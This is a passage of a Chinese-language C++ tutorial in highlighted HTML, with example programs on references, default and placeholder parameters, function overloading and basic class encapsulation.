class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> b = <span class="hljs-number">20</span>;<br><span class="hljs-comment">//int &amp;c; //错误，引用必须初始化</span><br><span class="hljs-type">int</span> &amp;c = a; <span class="hljs-comment">//一旦初始化后，就不可以更改</span><br>c = b; <span class="hljs-comment">//这是赋值操作，不是更改引用</span><br><br>cout &lt;&lt; <span class="hljs-string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;b = &quot;</span> &lt;&lt; b &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;c = &quot;</span> &lt;&lt; c &lt;&lt; endl;<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-3-引用做函数参数"><a href="#2-3-引用做函数参数" class="headerlink" title="2.3 引用做函数参数"></a>2.3 引用做函数参数</h3><p><strong>作用：</strong> 函数传参时，可以利用引用的技术让形参修饰实参</p><p><strong>优点：</strong> 可以简化指针修改实参</p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//1. 值传递</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">mySwap01</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>&#123;<br><span class="hljs-type">int</span> temp = a;<br>a = b;<br>b = temp;<br>&#125;<br><br><span class="hljs-comment">//2. 地址传递</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">mySwap02</span><span class="hljs-params">(<span class="hljs-type">int</span>* a, <span class="hljs-type">int</span>* b)</span> </span>&#123;<br><span class="hljs-type">int</span> temp = *a;<br>*a = *b;<br>*b = temp;<br>&#125;<br><br><span class="hljs-comment">//3. 引用传递</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">mySwap03</span><span class="hljs-params">(<span class="hljs-type">int</span>&amp; a, <span class="hljs-type">int</span>&amp; b)</span> </span>&#123;<br><span class="hljs-type">int</span> temp = a;<br>a = b;<br>b = temp;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> b = <span class="hljs-number">20</span>;<br><br><span class="hljs-built_in">mySwap01</span>(a, b);<br>cout &lt;&lt; <span class="hljs-string">&quot;a:&quot;</span> &lt;&lt; a &lt;&lt; <span class="hljs-string">&quot; b:&quot;</span> &lt;&lt; b &lt;&lt; endl;<br><br><span class="hljs-built_in">mySwap02</span>(&amp;a, &amp;b);<br>cout &lt;&lt; <span class="hljs-string">&quot;a:&quot;</span> &lt;&lt; a &lt;&lt; <span class="hljs-string">&quot; b:&quot;</span> &lt;&lt; b &lt;&lt; endl;<br><br><span class="hljs-built_in">mySwap03</span>(a, b);<br>cout &lt;&lt; <span class="hljs-string">&quot;a:&quot;</span> &lt;&lt; a &lt;&lt; <span class="hljs-string">&quot; b:&quot;</span> &lt;&lt; b &lt;&lt; endl;<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>总结：通过引用参数产生的效果同按地址传递是一样的。引用的语法更清楚简单</p></blockquote><h3 id="2-4-引用做函数返回值"><a href="#2-4-引用做函数返回值" class="headerlink" title="2.4 引用做函数返回值"></a>2.4 引用做函数返回值</h3><p>作用：引用是可以作为函数的返回值存在的</p><p>注意：<strong>不要返回局部变量引用</strong></p><p>用法：函数调用作为左值</p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//返回局部变量引用</span><br><span class="hljs-function"><span class="hljs-type">int</span>&amp; <span class="hljs-title">test01</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>; <span class="hljs-comment">//局部变量</span><br><span class="hljs-keyword">return</span> a;<br>&#125;<br><br><span class="hljs-comment">//返回静态变量引用</span><br><span class="hljs-function"><span class="hljs-type">int</span>&amp; <span class="hljs-title">test02</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> a = <span class="hljs-number">20</span>;<br><span class="hljs-keyword">return</span> a;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-comment">//不能返回局部变量的引用</span><br><span class="hljs-type">int</span>&amp; ref = <span class="hljs-built_in">test01</span>();<br>cout &lt;&lt; <span class="hljs-string">&quot;ref = &quot;</span> &lt;&lt; ref &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;ref = &quot;</span> &lt;&lt; ref &lt;&lt; endl;<br><br><span class="hljs-comment">//如果函数做左值，那么必须返回引用</span><br><span class="hljs-type">int</span>&amp; ref2 = <span class="hljs-built_in">test02</span>();<br>cout &lt;&lt; <span class="hljs-string">&quot;ref2 = &quot;</span> &lt;&lt; ref2 &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;ref2 = &quot;</span> &lt;&lt; ref2 &lt;&lt; endl;<br><br><span class="hljs-built_in">test02</span>() = <span class="hljs-number">1000</span>;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;ref2 = &quot;</span> &lt;&lt; ref2 &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;ref2 = &quot;</span> &lt;&lt; ref2 &lt;&lt; endl;<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-5-引用的本质"><a href="#2-5-引用的本质" class="headerlink" title="2.5 引用的本质"></a>2.5 引用的本质</h3><p>本质：<strong>引用的本质在c++内部实现是一个指针常量.</strong></p><p>讲解示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//发现是引用，转换为 int* const ref = &amp;a;</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span>&amp; ref)</span></span>&#123;<br>ref = <span class="hljs-number">100</span>; <span class="hljs-comment">// ref是引用，转换为*ref = 100</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;<br>    <br>    <span class="hljs-comment">//自动转换为 int* const ref = &amp;a; 指针常量是指针指向不可改，也说明为什么引用不可更改</span><br><span class="hljs-type">int</span>&amp; ref = a; <br>ref = <span class="hljs-number">20</span>; <span class="hljs-comment">//内部发现ref是引用，自动帮我们转换为: *ref = 20;</span><br>    <br>cout &lt;&lt; <span class="hljs-string">&quot;a:&quot;</span> &lt;&lt; a &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;ref:&quot;</span> &lt;&lt; ref &lt;&lt; endl;<br>    <br><span class="hljs-built_in">func</span>(a);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>结论：C++推荐用引用技术，因为语法方便，引用本质是指针常量，但是所有的指针操作编译器都帮我们做了</p><h3 id="2-6-常量引用"><a href="#2-6-常量引用" class="headerlink" title="2.6 常量引用"></a>2.6 常量引用</h3><p><strong>作用：</strong> 常量引用主要用来修饰形参，防止误操作</p><p>在函数形参列表中，可以加<em><strong>const修饰形参</strong></em>，防止形参改变实参</p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//引用使用的场景，通常用来修饰形参</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">showValue</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">int</span>&amp; v)</span> </span>&#123;<br><span class="hljs-comment">//v += 10;</span><br>cout &lt;&lt; v &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-comment">//int&amp; ref = 10;  引用本身需要一个合法的内存空间，因此这行错误</span><br><span class="hljs-comment">//加入const就可以了，编译器优化代码，int temp = 10; const int&amp; ref = temp;</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span>&amp; ref = <span class="hljs-number">10</span>;<br><br><span class="hljs-comment">//ref = 100;  //加入const后不可以修改变量</span><br>cout &lt;&lt; ref &lt;&lt; endl;<br><br><span class="hljs-comment">//函数中利用常量引用防止误操作修改实参</span><br><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;<br><span class="hljs-built_in">showValue</span>(a);<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-函数提高"><a href="#3-函数提高" class="headerlink" title="3 函数提高"></a>3 函数提高</h2><h3 id="3-1-函数默认参数"><a href="#3-1-函数默认参数" class="headerlink" title="3.1 函数默认参数"></a>3.1 函数默认参数</h3><p>在C++中，函数的形参列表中的形参是可以有默认值的。</p><p>语法：<code> 返回值类型  函数名 （参数= 默认值）&#123;&#125;</code></p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b = <span class="hljs-number">10</span>, <span class="hljs-type">int</span> c = <span class="hljs-number">10</span>)</span> </span>&#123;<br><span class="hljs-keyword">return</span> a + b + c;<br>&#125;<br><br><span class="hljs-comment">//1. 如果某个位置参数有默认值，那么从这个位置往后，从左向右，必须都要有默认值</span><br><span class="hljs-comment">//2. 如果函数声明有默认值，函数实现的时候就不能有默认参数</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">func2</span><span class="hljs-params">(<span class="hljs-type">int</span> a = <span class="hljs-number">10</span>, <span class="hljs-type">int</span> b = <span class="hljs-number">10</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">func2</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>&#123;<br><span class="hljs-keyword">return</span> a + b;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;ret = &quot;</span> &lt;&lt; <span class="hljs-built_in">func</span>(<span class="hljs-number">20</span>, <span class="hljs-number">20</span>) &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;ret = &quot;</span> &lt;&lt; <span class="hljs-built_in">func</span>(<span class="hljs-number">100</span>) &lt;&lt; endl;<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-2-函数占位参数"><a href="#3-2-函数占位参数" class="headerlink" title="3.2 函数占位参数"></a>3.2 函数占位参数</h3><p>C++中函数的形参列表里可以有占位参数，用来做占位，调用函数时必须填补该位置</p><p><strong>语法：</strong> <code>返回值类型 函数名 (数据类型)&#123;&#125;</code></p><p>在现阶段函数的占位参数存在意义不大，但是后面的课程中会用到该技术</p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//函数占位参数 ，占位参数也可以有默认参数</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span>)</span> </span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;this is func&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">func</span>(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>); <span class="hljs-comment">//占位参数必须填补</span><br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-3-函数重载"><a href="#3-3-函数重载" class="headerlink" title="3.3 函数重载"></a>3.3 函数重载</h3><h4 id="3-3-1-函数重载概述"><a href="#3-3-1-函数重载概述" class="headerlink" title="3.3.1 函数重载概述"></a>3.3.1 函数重载概述</h4><p>**作用：**函数名可以相同，提高复用性</p><p><strong>函数重载满足条件：</strong></p><ul><li>同一个作用域下</li><li>函数名称相同</li><li>函数参数<strong>类型不同</strong>  或者 <strong>个数不同</strong> 或者 <strong>顺序不同</strong></li></ul><p><strong>注意:</strong>  函数的返回值不可以作为函数重载的条件</p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//函数重载需要函数都在同一个作用域下</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;func 的调用！&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;func (int a) 的调用！&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">double</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;func (double a)的调用！&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> a ,<span class="hljs-type">double</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;func (int a ,double b) 的调用！&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">double</span> a ,<span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;func (double a ,int b)的调用！&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-comment">//函数返回值不可以作为函数重载条件</span><br><span class="hljs-comment">//int func(double a, int b)</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//cout &lt;&lt; &quot;func (double a ,int b)的调用！&quot; &lt;&lt; endl;</span><br><span class="hljs-comment">//&#125;</span><br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">func</span>();<br><span class="hljs-built_in">func</span>(<span class="hljs-number">10</span>);<br><span class="hljs-built_in">func</span>(<span class="hljs-number">3.14</span>);<br><span class="hljs-built_in">func</span>(<span class="hljs-number">10</span>,<span class="hljs-number">3.14</span>);<br><span class="hljs-built_in">func</span>(<span class="hljs-number">3.14</span> , <span class="hljs-number">10</span>);<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-3-2-函数重载注意事项"><a href="#3-3-2-函数重载注意事项" class="headerlink" title="3.3.2 函数重载注意事项"></a>3.3.2 函数重载注意事项</h4><ul><li>引用作为重载条件</li><li>函数重载碰到函数默认参数</li></ul><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//函数重载注意事项</span><br><span class="hljs-comment">//1、引用作为重载条件</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> &amp;a)</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;func (int &amp;a) 调用 &quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">int</span> &amp;a)</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;func (const int &amp;a) 调用 &quot;</span> &lt;&lt; endl;<br>&#125;<br><br><br><span class="hljs-comment">//2、函数重载碰到函数默认参数</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func2</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b = <span class="hljs-number">10</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;func2(int a, int b = 10) 调用&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func2</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;func2(int a) 调用&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;<br><span class="hljs-built_in">func</span>(a); <span class="hljs-comment">//调用无const</span><br><span class="hljs-built_in">func</span>(<span class="hljs-number">10</span>);<span class="hljs-comment">//调用有const</span><br><br><br><span class="hljs-comment">//func2(10); //碰到默认参数产生歧义，需要避免</span><br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-类和对象"><a href="#4-类和对象" class="headerlink" title="4 类和对象"></a><strong>4</strong> 类和对象</h2><p>C++面向对象的三大特性为：<strong>封装、继承、多态</strong></p><p>C++认为<strong>万事万物都皆为对象</strong>，对象上有其属性和行为</p><p><strong>例如：</strong></p><p>人可以作为对象，属性有姓名、年龄、身高、体重…，行为有走、跑、跳、吃饭、唱歌…<br><br>车也可以作为对象，属性有轮胎、方向盘、车灯…,行为有载人、放音乐、放空调…<br><br>具有相同性质的&#x3D;&#x3D;对象&#x3D;&#x3D;，我们可以抽象称为&#x3D;&#x3D;类&#x3D;&#x3D;，人属于人类，车属于车类</p><h3 id="4-1-封装"><a href="#4-1-封装" class="headerlink" title="4.1 封装"></a>4.1 封装</h3><h4 id="4-1-1-封装的意义"><a href="#4-1-1-封装的意义" class="headerlink" title="4.1.1  封装的意义"></a>4.1.1  封装的意义</h4><p>封装是C++面向对象三大特性之一</p><p>封装的意义：</p><ul><li>将属性和行为作为一个整体，表现生活中的事物</li><li>将属性和行为加以权限控制</li></ul><p><strong>封装意义一：</strong></p><p>在设计类的时候，属性和行为写在一起，表现事物</p><p><strong>语法：</strong> <code>class 类名&#123;   访问权限： 属性  / 行为  &#125;;</code></p><p>**示例1：**设计一个圆类，求圆的周长</p><p><strong>示例代码：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//圆周率</span><br><span class="hljs-type">const</span> <span class="hljs-type">double</span> PI = <span class="hljs-number">3.14</span>;<br><br><span class="hljs-comment">//1、封装的意义</span><br><span class="hljs-comment">//将属性和行为作为一个整体，用来表现生活中的事物</span><br><br><span class="hljs-comment">//封装一个圆类，求圆的周长</span><br><span class="hljs-comment">//class代表设计一个类，后面跟着的是类名</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span><br>&#123;<br><span class="hljs-keyword">public</span>:  <span class="hljs-comment">//访问权限  公共的权限</span><br><br><span class="hljs-comment">//属性</span><br><span class="hljs-type">int</span> m_r;<span class="hljs-comment">//半径</span><br><br><span class="hljs-comment">//行为</span><br><span class="hljs-comment">//获取到圆的周长</span><br><span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">calculateZC</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//2 * pi  * r</span><br><span class="hljs-comment">//获取圆的周长</span><br><span class="hljs-keyword">return</span>  <span class="hljs-number">2</span> * PI * m_r;<br>&#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-comment">//通过圆类，创建圆的对象</span><br><span class="hljs-comment">// c1就是一个具体的圆</span><br>Circle c1;<br>c<span class="hljs-number">1.</span>m_r = <span class="hljs-number">10</span>; <span class="hljs-comment">//给圆对象的半径 进行赋值操作</span><br><br><span class="hljs-comment">//2 * pi * 10 = = 62.8</span><br>cout &lt;&lt; <span class="hljs-string">&quot;圆的周长为： &quot;</span> &lt;&lt; c<span class="hljs-number">1.</span><span class="hljs-built_in">calculateZC</span>() &lt;&lt; endl;<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>**示例2：**设计一个学生类，属性有姓名和学号，可以给姓名和学号赋值，可以显示学生的姓名和学号</p><p><strong>示例2代码：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//学生类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(string name)</span> </span>&#123;<br>m_name = name;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setID</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> </span>&#123;<br>m_id = id;<br>&#125;<br><br><span class="hljs-function"><span 